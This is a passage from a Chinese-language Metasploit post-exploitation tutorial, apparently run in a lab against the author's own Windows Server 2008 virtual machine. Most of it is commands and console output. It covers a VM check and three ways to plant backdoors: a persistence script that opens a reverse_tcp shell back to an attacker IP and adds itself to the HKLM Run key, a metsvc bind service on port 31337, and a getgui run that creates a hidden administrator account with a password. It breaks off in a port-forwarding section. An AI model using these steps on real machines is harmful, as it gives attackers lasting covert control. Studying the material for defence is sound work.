<p>748&nbsp;&nbsp;&nbsp;492&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYLOCAL&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32\svchost.exe</p>
<p>796&nbsp;&nbsp;&nbsp;492&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYSYSTEM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32\svchost.exe</p>
<p>840&nbsp;&nbsp;&nbsp;492&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYLOCAL&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32\svchost.exe</p>
<p>856&nbsp;&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;conhost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-K30V5SI0PCEAdministrator&nbsp;&nbsp;C:\Windows\system32\conhost.exe</p>
<p>860&nbsp;&nbsp;&nbsp;2044&nbsp;&nbsp;cmd.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-K30V5SI0PCEAdministrator&nbsp;&nbsp;C:\Windows\system32\cmd.exe</p>
<p>884&nbsp;&nbsp;&nbsp;492&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYSYSTEM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32\svchost.exe</p>
<p>924&nbsp;&nbsp;&nbsp;492&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYNETWORK&nbsp;SERVICE&nbsp;&nbsp;&nbsp;C:\Windows\system32\svchost.exe</p>
<p>972&nbsp;&nbsp;&nbsp;492&nbsp;&nbsp;&nbsp;sppsvc.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYNETWORK&nbsp;SERVICE&nbsp;&nbsp;&nbsp;C:\Windows\system32\sppsvc.exe</p>
<p>976&nbsp;&nbsp;&nbsp;492&nbsp;&nbsp;&nbsp;spoolsv.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYSYSTEM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32\spoolsv.exe</p>
<p>1056&nbsp;&nbsp;492&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYLOCAL&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32\svchost.exe</p>
<p>1092&nbsp;&nbsp;492&nbsp;&nbsp;&nbsp;vmtoolsd.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYSYSTEM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Program&nbsp;Files\VMware\VMware&nbsp;Toolsvmtoolsd.exe</p>
<p>1332&nbsp;&nbsp;492&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYNETWORK&nbsp;SERVICE&nbsp;&nbsp;&nbsp;C:\Windows\system32\svchost.exe</p>
<p>1492&nbsp;&nbsp;2044&nbsp;&nbsp;vmtoolsd.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-K30V5SI0PCEAdministrator&nbsp;&nbsp;C:\Program&nbsp;Files\VMware\VMware&nbsp;Toolsvmtoolsd.exe</p>
<p>1560&nbsp;&nbsp;492&nbsp;&nbsp;&nbsp;dllhost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYSYSTEM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32\dllhost.exe</p>
<p>1640&nbsp;&nbsp;492&nbsp;&nbsp;&nbsp;msdtc.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYNETWORK&nbsp;SERVICE&nbsp;&nbsp;&nbsp;C:\Windows\system32\msdtc.exe</p>
<p>1968&nbsp;&nbsp;492&nbsp;&nbsp;&nbsp;taskhost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-K30V5SI0PCEAdministrator&nbsp;&nbsp;C:\Windows\system32\taskhost.exe</p>
<p>2024&nbsp;&nbsp;884&nbsp;&nbsp;&nbsp;dwm.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-K30V5SI0PCEAdministrator&nbsp;&nbsp;C:\Windows\system32\Dwm.exe</p>
<p>2044&nbsp;&nbsp;2016&nbsp;&nbsp;explorer.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-K30V5SI0PCEAdministrator&nbsp;&nbsp;C:\Windows\Explorer.EXE</p>
<p>2312&nbsp;&nbsp;492&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYSYSTEM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32\svchost.exe</p>
<p>2428&nbsp;&nbsp;492&nbsp;&nbsp;&nbsp;mscorsvw.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYSYSTEM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NETFramework64v2.0.50727\mscorsvw.exe</p>
<p>2588&nbsp;&nbsp;492&nbsp;&nbsp;&nbsp;mscorsvw.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYSYSTEM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NETFrameworkv2.0.50727\mscorsvw.exe</p>
<p>2972&nbsp;&nbsp;492&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYSYSTEM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32\svchost.exe</p>
<p>如上所示file.exe进程已经没了。需要注意的是如果存在杀软的话可能会阻止进程注入<span lang="EN-US"><br></span>(3).测试是不是虚拟机</p>
<p>meterpreter&nbsp;&gt;&nbsp;run&nbsp;post/windows/gather/checkvm</p>
<p>&nbsp;</p>
<p>[*]&nbsp;Checking&nbsp;if&nbsp;WIN-K30V5SI0PCE&nbsp;is&nbsp;a&nbsp;Virtual&nbsp;Machine&nbsp;.....</p>
<p>[*]&nbsp;This&nbsp;is&nbsp;a&nbsp;VMware&nbsp;Virtual&nbsp;Machine</p>
<p>我的2008是装在VMWare上的<span lang="EN-US"><br></span>(4).安装后门<br>方法一:persistence方法</p>
<p>meterpreter&nbsp;&gt;&nbsp;run&nbsp;&nbsp;persistence&nbsp;-h</p>
<p>Meterpreter&nbsp;Script&nbsp;<span lang="EN-US">for</span>&nbsp;creating&nbsp;a&nbsp;persistent&nbsp;backdoor&nbsp;on&nbsp;a&nbsp;target&nbsp;host.</p>
<p>&nbsp;</p>
<p>OPTIONS:</p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;-A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Automatically&nbsp;start&nbsp;a&nbsp;matching&nbsp;multi/handler&nbsp;<span lang="EN-US">to</span>&nbsp;connect&nbsp;<span lang="EN-US">to</span>&nbsp;the&nbsp;agent</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;-L&nbsp;&lt;opt&gt;&nbsp;&nbsp;Location&nbsp;<span lang="EN-US">in</span>&nbsp;target&nbsp;host&nbsp;where&nbsp;<span lang="EN-US">to</span>&nbsp;write&nbsp;payload&nbsp;<span lang="EN-US">to</span>,&nbsp;<span lang="EN-US">if</span>&nbsp;none&nbsp;%TEMP%&nbsp;willbe&nbsp;used.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;-P&nbsp;&lt;opt&gt;&nbsp;&nbsp;Payload&nbsp;<span lang="EN-US">to</span>&nbsp;<span lang="EN-US">use</span>,&nbsp;<span lang="EN-US">default</span>&nbsp;<span lang="EN-US">is</span>&nbsp;windows/meterpreter/reverse_tcp.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;-S&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Automatically&nbsp;start&nbsp;the&nbsp;agent&nbsp;on&nbsp;boot&nbsp;<span lang="EN-US">as</span>&nbsp;a&nbsp;service&nbsp;(with&nbsp;SYSTEM&nbsp;privileges)</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;-T&nbsp;&lt;opt&gt;&nbsp;&nbsp;Alternate&nbsp;executable&nbsp;template&nbsp;<span lang="EN-US">to</span>&nbsp;<span lang="EN-US">use</span></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;-U&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Automatically&nbsp;start&nbsp;the&nbsp;agent&nbsp;when&nbsp;the&nbsp;User&nbsp;logs&nbsp;on</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;-X&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Automatically&nbsp;start&nbsp;the&nbsp;agent&nbsp;when&nbsp;the&nbsp;system&nbsp;boots</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;-h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span lang="EN-US">This</span>&nbsp;help&nbsp;menu</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;-i&nbsp;&lt;opt&gt;&nbsp;&nbsp;The&nbsp;interval&nbsp;<span lang="EN-US">in</span>&nbsp;seconds&nbsp;between&nbsp;<span lang="EN-US">each</span>&nbsp;connection&nbsp;attempt</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;-p&nbsp;&lt;opt&gt;&nbsp;&nbsp;The&nbsp;port&nbsp;on&nbsp;the&nbsp;remote&nbsp;host&nbsp;where&nbsp;Metasploit&nbsp;<span lang="EN-US">is</span>&nbsp;listening</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;-r&nbsp;&lt;opt&gt;&nbsp;&nbsp;The&nbsp;IP&nbsp;of&nbsp;the&nbsp;system&nbsp;running&nbsp;Metasploit&nbsp;listening&nbsp;<span lang="EN-US">for</span>&nbsp;the&nbsp;connect&nbsp;back</p>
<p>&nbsp;执行:</p>
<p>meterpreter&nbsp;&gt;&nbsp;run&nbsp;persistence&nbsp;-X&nbsp;-i&nbsp;10&nbsp;-p&nbsp;2241&nbsp;-r&nbsp;192.168.111.129</p>
<p>[*]&nbsp;Running&nbsp;Persistance&nbsp;Script</p>
<p>[*]&nbsp;Resource&nbsp;file&nbsp;for&nbsp;cleanup&nbsp;created&nbsp;at&nbsp;/root/.msf4/logs/persistence/WIN-K30V5SI0PCE_20140313.5419/WIN-K30V5SI0PCE_20140313.5419.rc</p>
<p>[*]&nbsp;Creating&nbsp;Payload=windows/meterpreter/reverse_tcp&nbsp;LHOST=192.168.111.129&nbsp;LPORT=2241</p>
<p>[*]&nbsp;Persistent&nbsp;agent&nbsp;script&nbsp;is&nbsp;148439&nbsp;bytes&nbsp;long</p>
<p>[+]&nbsp;Persistent&nbsp;Script&nbsp;written&nbsp;to&nbsp;C:UsersADMINI~1AppDataLocalTempUhyxOTTzTb.vbs</p>
<p>[*]&nbsp;Executing&nbsp;script&nbsp;C:UsersADMINI~1AppDataLocalTempUhyxOTTzTb.vbs</p>
<p>[+]&nbsp;Agent&nbsp;executed&nbsp;with&nbsp;PID&nbsp;2916</p>
<p>[*]&nbsp;Installing&nbsp;into&nbsp;autorun&nbsp;as&nbsp;HKLM\Software\Microsoft\Windows\Current\Version\Run\HstWtPyXHYnhQ</p>
<p>[+]&nbsp;Installed&nbsp;into&nbsp;autorun&nbsp;as&nbsp;HKLM\Software\Microsoft\Windows\Current\Version\Run\HstWtPyXHYnhQ</p>
<p>现在退出服务器<span lang="EN-US&gt;">,</span>重新配置监听器</p>
<p>msf&nbsp;&gt;&nbsp;use&nbsp;multi/handler</p>
<p>msf&nbsp;exploit(handler)&nbsp;&gt;&nbsp;set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp</p>
<p>msf&nbsp;exploit(handler)&nbsp;&gt;&nbsp;set&nbsp;LHOST&nbsp;192.168.111.129</p>
<p>msf&nbsp;exploit(handler)&nbsp;&gt;&nbsp;set&nbsp;LPORT&nbsp;2241</p>
<p>msf&nbsp;exploit(handler)&nbsp;&gt;&nbsp;exploit</p>
<p>&nbsp;</p>
<p>[*]&nbsp;Started&nbsp;reverse&nbsp;handler&nbsp;on&nbsp;192.168.111.129:2241</p>
<p>[*]&nbsp;Starting&nbsp;the&nbsp;payload&nbsp;handler...</p>
<p>[*]&nbsp;Sending&nbsp;stage&nbsp;(769024&nbsp;bytes)&nbsp;to&nbsp;192.168.111.133</p>
<p>[*]&nbsp;Meterpreter&nbsp;session&nbsp;1&nbsp;opened&nbsp;(192.168.111.129:2241&nbsp;-&gt;&nbsp;192.168.111.133:49159)&nbsp;at2014-03-13&nbsp;23:01:55&nbsp;+0800</p>
<p>如图，反弹成功，这个被动型的后门在某些特殊的场合会是个不错的选择<span lang="EN-US"><br></span>方法二:metsvc</p>
<p>meterpreter&nbsp;&gt;&nbsp;run&nbsp;metsvc</p>
<p>[*]&nbsp;Creating&nbsp;a&nbsp;meterpreter&nbsp;service&nbsp;on&nbsp;port&nbsp;31337</p>
<p>[*]&nbsp;Creating&nbsp;a&nbsp;temporary&nbsp;installation&nbsp;directory&nbsp;C:\Users\ADMINI~1\AppData\LocalTemp\HzWbqqRpuBlxn...</p>
<p>[*]&nbsp;&nbsp;&gt;&gt;&nbsp;Uploading&nbsp;metsrv.x86.dll...</p>
<p>[*]&nbsp;&nbsp;&gt;&gt;&nbsp;Uploading&nbsp;metsvc-server.exe...</p>
<p>[*]&nbsp;&nbsp;&gt;&gt;&nbsp;Uploading&nbsp;metsvc.exe...</p>
<p>[*]&nbsp;Starting&nbsp;the&nbsp;service...</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Installing&nbsp;service&nbsp;metsvc</p>
<p>*&nbsp;Starting&nbsp;service</p>
<p>Service&nbsp;metsvc&nbsp;successfully&nbsp;installed.</p>
<p>&nbsp;</p>
<p>metsvc后门安装成功，接下来是连接</p>
<p>root@Kali:~# msfconsole</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;,</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;((__---,,,---__))</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(_)&nbsp;O&nbsp;O&nbsp;(_)_________</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o_o&nbsp;&nbsp;&nbsp;&nbsp;M&nbsp;S&nbsp;F&nbsp;&nbsp;&nbsp;|</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_____&nbsp;&nbsp;|&nbsp;&nbsp;*</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|||&nbsp;&nbsp;&nbsp;WW|||</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|||&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|||</p>
<p>&nbsp;</p>
<p>Using&nbsp;notepad&nbsp;to&nbsp;track&nbsp;pentests?&nbsp;Have&nbsp;Metasploit&nbsp;Pro&nbsp;report&nbsp;on&nbsp;hosts,</p>
<p>services,&nbsp;sessions&nbsp;and&nbsp;evidence&nbsp;--&nbsp;type&nbsp;'go_pro'&nbsp;to&nbsp;launch&nbsp;it&nbsp;now.</p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=[&nbsp;metasploit&nbsp;v4.8.1-2013120401&nbsp;[core:4.8&nbsp;api:1.0]</p>
<p>+&nbsp;--&nbsp;--=[&nbsp;1239&nbsp;exploits&nbsp;-&nbsp;755&nbsp;auxiliary&nbsp;-&nbsp;207&nbsp;post</p>
<p>+&nbsp;--&nbsp;--=[&nbsp;324&nbsp;payloads&nbsp;-&nbsp;31&nbsp;encoders&nbsp;-&nbsp;8&nbsp;nops</p>
<p>&nbsp;</p>
<p>msf&nbsp;&gt;&nbsp;use&nbsp; exploit/multi/handler</p>
<p>msf&nbsp;exploit(handler)&nbsp;&gt;&nbsp;set&nbsp;PAYLOAD&nbsp;windows/meterpreter/metsvc_bind_tcp</p>
<p>msf&nbsp;exploit(handler)&nbsp;&gt;&nbsp;show&nbsp;options</p>
<p>&nbsp;</p>
<p>Module&nbsp;options&nbsp;(exploit/multi/handler):</p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description</p>
<p>&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------</p>
<p>&nbsp;</p>
<p>Payload&nbsp;options&nbsp;(windows/metsvc_bind_tcp):</p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description</p>
<p>&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------</p>
<p>&nbsp;&nbsp;&nbsp;EXITFUNC&nbsp;&nbsp;process&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Exit&nbsp;technique:&nbsp;seh,&nbsp;thread,&nbsp;process,&nbsp;none</p>
<p>&nbsp;&nbsp;&nbsp;LPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4444&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;listen&nbsp;port</p>
<p>&nbsp;&nbsp;&nbsp;RHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;target&nbsp;address</p>
<p>&nbsp;</p>
<p>Exploit&nbsp;target:</p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;Id&nbsp;&nbsp;Name</p>
<p>&nbsp;&nbsp;&nbsp;--&nbsp;&nbsp;----</p>
<p>&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;Wildcard&nbsp;Target</p>
<p>&nbsp;</p>
<p>msf&nbsp;exploit(handler)&nbsp;&gt;&nbsp;set&nbsp;RHOST&nbsp;192.168.111.133</p>
<p>msf&nbsp;exploit(handler)&nbsp;&gt;&nbsp;set&nbsp;LPORT&nbsp;31337</p>
<p>msf&nbsp;exploit(handler)&nbsp;&gt;&nbsp;exploit</p>
<p>[*]&nbsp;Started&nbsp;bind&nbsp;handler</p>
<p>[*]&nbsp;Starting&nbsp;the&nbsp;payload&nbsp;handler...</p>
<p>[*]&nbsp;Meterpreter&nbsp;session&nbsp;1&nbsp;opened&nbsp;(192.168.111.129:49313&nbsp;-&gt;&nbsp;192.168.111.133:31337)&nbsp;at2014-03-13&nbsp;23:12:54&nbsp;+0800</p>
<p>meterpreter&nbsp;&gt;</p>
<p>方法三<span lang="EN-US&gt;">:</span>这个是类似于添加账户3389远程连接</p>
<p>meterpreter&nbsp;&gt;&nbsp;run&nbsp;getgui&nbsp;-u&nbsp;zero&nbsp;-p&nbsp;haizeiwang123_</p>
<p>[*]&nbsp;Windows&nbsp;Remote&nbsp;Desktop&nbsp;Configuration&nbsp;Meterpreter&nbsp;Script&nbsp;by&nbsp;Darkoperator</p>
<p>[*]&nbsp;Carlos&nbsp;Perez&nbsp;carlos_perez@darkoperator.com</p>
<p>[*]&nbsp;Setting&nbsp;user&nbsp;account&nbsp;for&nbsp;logon</p>
<p>[*]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Adding&nbsp;User:&nbsp;zero&nbsp;with&nbsp;Password:&nbsp;haizeiwang123_</p>
<p>[*]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hiding&nbsp;user&nbsp;from&nbsp;Windows&nbsp;Login&nbsp;screen</p>
<p>[*]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Adding&nbsp;User:&nbsp;zero&nbsp;to&nbsp;local&nbsp;group&nbsp;'Remote
Desktop Users'</p>
<p>[*]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Adding&nbsp;User:&nbsp;zero&nbsp;to&nbsp;local&nbsp;group&nbsp;'Administrators'</p>
<p>[*]&nbsp;You&nbsp;can&nbsp;now&nbsp;login&nbsp;with&nbsp;the&nbsp;created&nbsp;user</p>
<p>[*]&nbsp;For&nbsp;cleanup&nbsp;use&nbsp;command:&nbsp;run&nbsp;multi_console_command&nbsp;-rc&nbsp;/root/.msf4/logs/scripts/getgui/clean_up__20140314.4134.rc</p>
<p>meterpreter&nbsp;&gt;</p>
<p><span lang="EN-US">(5).</span>端口转发<br>主机处于内网也是比较常见的<span lang="EN-US&gt;">,metasploit</span>自带了一个端口转发工具</p>
<p>meterpreter&nbsp;&gt;&nbsp;portfwd&nbsp;-h</p>
<p>Usage:&nbsp;portfwd&nbsp;[-h]&nbsp;[add&nbsp;|&nbsp;delete&nbsp;|&nbsp;list&nbsp;|&nbsp;flush]&nbsp;[args]</p>
<p>OPTIONS:</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;-L&nbsp;&lt;opt&gt;&nbsp;&nbsp;The&nbsp;local&nbsp;host&nbsp;to&nbsp;listen&nbsp;on&nbsp;(optional).</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;-h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Help&nbsp;banner.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;-l&nbsp;&lt;opt&gt;&nbsp;&nbsp;The&nbsp;local&nbsp;port&nbsp;to&nbsp;listen&nbsp;on.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;-p&nbsp;&lt;opt&gt;&nbsp;&nbsp;The&nbsp;remote&nbsp;port&nbsp;to&nbsp;connect&nbsp;to.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;-r&nbsp;&lt;opt&gt;&nbsp;&nbsp;The&nbsp;remote&nbsp;host&nbsp;to&nbsp;connect&nbsp;to.</p>
<p>&nbsp;</p>
